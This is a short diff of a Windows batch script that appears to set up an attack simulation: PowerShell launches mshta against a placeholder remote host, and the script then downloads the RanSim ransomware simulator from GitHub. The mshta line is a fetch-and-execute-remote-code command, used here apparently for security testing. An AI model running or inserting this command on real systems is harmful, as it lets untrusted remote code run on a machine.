@@ -1,6 +1,6 @@
 @echo off
 setlocal
-powershell.exe -Command "mshta http://<ip address>/<endpoint>"
+powershell.exe -Command "mshta http://<ip address/domain>/<endpoint>"
 rem Define variables
 rem installing the RanSim from the github
 set "githubUrl=https://github.com/lawndoc/RanSim/archive/main.zip"
